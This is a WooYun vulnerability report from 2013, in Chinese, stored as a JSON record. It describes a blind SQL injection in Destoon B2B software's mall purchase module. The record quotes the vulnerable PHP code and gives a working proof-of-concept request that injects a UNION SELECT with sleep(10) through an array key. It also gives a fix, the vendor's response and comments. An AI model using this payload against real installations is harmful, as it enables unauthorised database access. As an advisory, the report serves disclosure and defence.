{"id": 8810, "wybug_id": "wooyun-2013-027958", "wybug_title": "Destoon B2B建站软件最新版SQL盲注漏洞", "wybug_corp": "DESTOON", "wybug_author": "hawkish001", "wybug_date": "2013-07-25 16:52", "wybug_open_date": "2013-10-20 16:53", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-20：\t细节向公众公开  简要描述： Destoon B2B建站存在SQL注入漏洞（已经打了20130703补丁） 详细说明：  /module/mall/buy.inc.php 这个文件，除了已经修复了的知道创宇上报的那个注入点，还存在其他注入点。\nif($submit) {\trequire DT_ROOT.'/module/'.$module.'/cart.class.php';\t$do = new cart();\t$cart = $do->get();\tif($post) {\t\t$add = array_map('trim', $add);\t\t$add['address'] = area_pos($add['areaid'], '').$add['address'];\t\t$add = array_map('htmlspecialchars', $add);\t\t$buyer_address = $add['address'];\t\tif(strlen($buyer_address) < 10) message($L['msg_type_address']);\t\t$buyer_postcode = $add['postcode'];\t\tif(strlen($buyer_postcode) < 6) message($L['msg_type_postcode']);\t\t$buyer_name = $add['truename'];\t\tif(strlen($buyer_name) < 2) message($L['msg_type_truename']);\t\t$buyer_mobile = $add['mobile'];\t\tif(strlen($buyer_mobile) < 11) message($L['msg_type_mobile']);\t\t$buyer_phone = $add['telephone'];\t\t$buyer_receive = $add['receive'];\t\tif(strlen($buyer_receive) < 2) message($L['msg_type_express']);\t\t$i = 0;\t\tforeach($post as $k=>$v) {\t\t\t$t1 = explode('-', $k);\t\t\t$itemid = $t1[0];\t\t\t$s1 = $t1[1];\t\t\t$s2 = $t1[2];\t\t\t$s3 = $t1[3];\t\t\t$t = $db->get_one(\"SELECT * FROM {$table} WHERE itemid=$itemid\");\n其中$submit,$post,$add都是外部提交数据。由于$t = $db->get_one(\"SELECT * FROM {$table} WHERE itemid=$itemid\");由于$itemid由$post数组的key赋值，被输入控制，且SQL语句里面没有单引号包围$itemid,导致绕过GPC防护，可以进行union查询盲注。   漏洞证明：  需要登录，http://localhost/webapp/destoon/mall/buy.php?add[address]=abcdefghijklm&add[postcode]=abcdefghijklm&add[truename]=abcdefghijklm&add[mobile]=abcdefghijklm&add[telephone]=abcdefghijklm&add[receive]=abcdefghijklm&post[1 union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(10) from destoon_member]=b同时POST提交submit=1我把执行的SQL语句打印出来了。\n\n   修复方案：  数据过滤，整型数据请用intval()   版权声明：转载请注明来源 hawkish001@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-10-20 16:53 厂商回复：  最新状态： 2013-08-20：感谢提醒，已经修复，详见：http://bbs.destoon.com/thread-53071-1-1.html  ", "replys": "漏洞评价：\n评论\n     2013-07-26 21:47 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  嗨，估计厂商是不会来了，注册了不领漏洞    \n     2013-08-20 10:58 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @DESTOON 都忽略了还更新个屁状态。。。。    \n     2013-10-23 12:30 |    \t\t爱小菜 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | 本人菜鸟一枚，努力学习天天向上！希望能让...)\t\t \n  强烈希望各位大牛以后遇到destoon漏洞不要往乌云上发了！否则厂家依然会“故技重施”的！万分感谢！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}